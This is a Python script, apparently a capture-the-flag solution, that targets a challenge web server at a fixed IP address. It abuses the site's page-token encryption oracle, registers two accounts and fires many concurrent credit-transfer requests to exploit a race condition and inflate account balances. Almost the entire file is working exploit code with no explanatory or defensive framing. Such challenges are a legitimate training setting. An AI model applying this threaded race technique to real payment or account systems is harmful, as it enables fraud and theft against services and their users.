#!/usr/bin/env python3

import requests
import urllib
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

def setup_proxy():
	os.environ.setdefault('HTTP_PROXY','http://localhost:8080')

GLOBAL_STRING_LOOKUP = {}
def get_string_from_challenge_server(st):
	# encryption oracle in 
	global GLOBAL_STRING_LOOKUP
	if st in GLOBAL_STRING_LOOKUP:
		return GLOBAL_STRING_LOOKUP[st]
	r = requests.get('http://3.93.128.89:1212/',{'page':st})
	q = urllib.parse.urlparse(r.url).query
	tok = urllib.parse.parse_qs(q)['from_page'][0]
	GLOBAL_STRING_LOOKUP[st] = tok
	return tok

def challenge_login(username,password):
	login_token = get_string_from_challenge_server('login')
	r = requests.post('http://3.93.128.89:1212/?page=%s'%login_token, data={'username':username,'password':password})
	phpsessid = r.headers['Set-Cookie'].split(';')[0]
	return phpsessid, r.status_code, r.text

def challenge_register(username,password):
	register_token = get_string_from_challenge_server('register')
	r = requests.post('http://3.93.128.89:1212/?page=%s'%register_token, data={'username':username,'password':password,'confirm':password,'redirect':'aaa'})
	return r.status_code, r.text

def challenge_logout(phpsessid):
	logout_token = get_string_from_challenge_server('logout')
	r = requests.get('http://3.93.128.89:1212/?page=%s'%logout_token, headers={'Cookie':phpsessid})
	return r.status_code, r.text

def submit_transfer(phpsessid,st,ncredits=1):
	account_token = get_string_from_challenge_server('account')
	st_token = get_string_from_challenge_server(st)
	r = requests.post('http://3.93.128.89:1212/?page=%s'%account_token,
		data={'credits':str(ncredits),'destination':st_token},
		headers={'Cookie':phpsessid})
	return r.status_code, r.text

def transfer_race(fromname,toname,nthreads,ncredits):
	print('%d threads transfering %d credits from %s to %s' % (nthreads,ncredits,fromname,toname))
	phpid,code,text = challenge_login(fromname,fromname)

	tarr = []
	for i in range(nthreads):
		tarr.append(threading.Thread(target=submit_transfer, args=(phpid,'sendto:'+toname,ncredits)))
	for t in tarr:
		t.start()
	for t in tarr:
		t.join()

	challenge_logout(phpid)

if __name__ == '__main__':

	setup_proxy()

	user1 = 'srxerfsref'
	user2 = 'setzxefses'

	challenge_register(user1,user1)
	challenge_register(user2,user2)

	for count in range(5):
		transfer_race(user1,user2,1,1)
		transfer_race(user2,user1,20,1)

	for count in range(20):
		transfer_race(user1,user2,1,20)
		transfer_race(user2,user1,20,20)

